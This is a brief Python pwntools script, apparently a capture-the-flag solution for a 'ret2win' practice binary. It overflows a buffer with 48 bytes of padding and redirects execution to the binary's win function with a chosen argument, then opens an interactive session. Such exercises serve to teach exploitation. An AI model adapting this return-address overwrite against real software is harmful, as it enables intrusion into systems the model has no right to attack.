from pwn import *

elf = ELF("./ret2win")  

context.binary = elf

io = process("./ret2win")
# io = remote("0.0.0.0",1003)

# Offset to overwrite the return address
padding = 48 
# Call the win function with the correct argument (0x1412)
payload = b"A" * padding + p32(0x4a55) +  b"A"*12 + p32(elf.symbols.win) + p32(0x0) +p32(0x1412)

io.sendlineafter("input: ",payload)

io.interactive()